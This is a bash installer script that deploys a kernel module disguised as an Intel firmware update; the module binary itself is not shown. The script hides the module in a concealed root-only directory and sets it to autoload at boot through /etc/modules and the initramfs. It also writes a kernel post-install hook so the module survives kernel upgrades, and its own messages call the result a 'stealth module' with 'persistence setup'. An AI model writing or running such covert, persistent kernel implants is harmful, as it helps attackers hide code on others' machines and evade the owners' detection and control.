#!/bin/bash
set -e

# Config
MODULE_SRC="intel_fw_update.ko"  # Must exist in current directory when running
MODULE_NAME="intel_fw_update"
HIDDEN_DIR="/usr/local/.intel_fw_update"
HIDDEN_KO_PATH="$HIDDEN_DIR/$MODULE_SRC"
MODULES_FILE="/etc/modules"
HOOK_PATH="/etc/kernel/postinst.d/install_${MODULE_NAME}_module"

echo "== [*] Checking for existing module =="

# Unload module if loaded
if lsmod | grep -q "^${MODULE_NAME}"; then
    echo "[*] Module $MODULE_NAME is loaded — unloading"
    sudo modprobe -r "$MODULE_NAME"
fi

# Remove old entry in /etc/modules
if grep -q "^${MODULE_NAME}$" "$MODULES_FILE"; then
    echo "[*] Removing $MODULE_NAME from $MODULES_FILE"
    sudo sed -i "/^${MODULE_NAME}$/d" "$MODULES_FILE"
fi

# Remove installed module file for current kernel
INSTALL_DIR="/lib/modules/$(uname -r)/updates/firmware-intel"
MODULE_PATH="$INSTALL_DIR/${MODULE_NAME}.ko"

if [ -f "$MODULE_PATH" ]; then
    echo "[*] Removing old $MODULE_PATH"
    sudo rm -f "$MODULE_PATH"
fi

echo "== [*] Installing stealth module =="

# Check .ko exists in current directory
if [ ! -f "$MODULE_SRC" ]; then
    echo "[!] Error: $MODULE_SRC not found in current directory"
    exit 1
fi

# Create hidden directory if needed
if [ ! -d "$HIDDEN_DIR" ]; then
    echo "[*] Creating hidden directory $HIDDEN_DIR"
    sudo mkdir -p "$HIDDEN_DIR"
    sudo chmod 700 "$HIDDEN_DIR"
fi

# Copy .ko to hidden directory if not already there or if different
COPY_NEEDED=1
if [ -f "$HIDDEN_KO_PATH" ]; then
    if cmp -s "$MODULE_SRC" "$HIDDEN_KO_PATH"; then
        COPY_NEEDED=0
    fi
fi

if [ $COPY_NEEDED -eq 1 ]; then
    echo "[*] Copying $MODULE_SRC to hidden location $HIDDEN_KO_PATH"
    sudo cp "$MODULE_SRC" "$HIDDEN_KO_PATH"
    sudo chmod 600 "$HIDDEN_KO_PATH"
fi

# Create kernel modules install dir
if [ ! -d "$INSTALL_DIR" ]; then
    echo "[*] Creating directory $INSTALL_DIR"
    sudo mkdir -p "$INSTALL_DIR"
fi

# Copy module from hidden dir to kernel modules folder
echo "[*] Installing module from hidden directory to $MODULE_PATH"
sudo cp "$HIDDEN_KO_PATH" "$MODULE_PATH"

# Update module dependencies for current kernel
echo "[*] Running depmod"
sudo depmod -a

# Add to /etc/modules for boot autoload if not present
if ! grep -q "^${MODULE_NAME}$" "$MODULES_FILE"; then
    echo "[*] Adding $MODULE_NAME to $MODULES_FILE"
    echo "$MODULE_NAME" | sudo tee -a "$MODULES_FILE" > /dev/null
fi

# Update initramfs for current kernel
echo "[*] Updating initramfs"
sudo update-initramfs -u

# Load the module now
echo "[*] Loading module using modprobe"
sudo modprobe "$MODULE_NAME"

# Create kernel update hook script
echo "== [*] Creating kernel update hook script to reinstall module on kernel upgrades"

sudo tee "$HOOK_PATH" > /dev/null << EOF
#!/bin/bash
# Kernel post-install hook to reinstall $MODULE_NAME module after kernel updates

MODULE_NAME="$MODULE_NAME"
HIDDEN_KO_PATH="$HIDDEN_KO_PATH"

KVER="\$1"
INSTALL_DIR="/lib/modules/\$KVER/updates/firmware-intel"
MODULE_PATH="\$INSTALL_DIR/\${MODULE_NAME}.ko"

mkdir -p "\$INSTALL_DIR"
cp "\$HIDDEN_KO_PATH" "\$MODULE_PATH"
depmod -a -b /lib/modules/\$KVER
update-initramfs -u -k "\$KVER"
EOF

sudo chmod +x "$HOOK_PATH"

echo "== [✓] Installation and persistence setup complete =="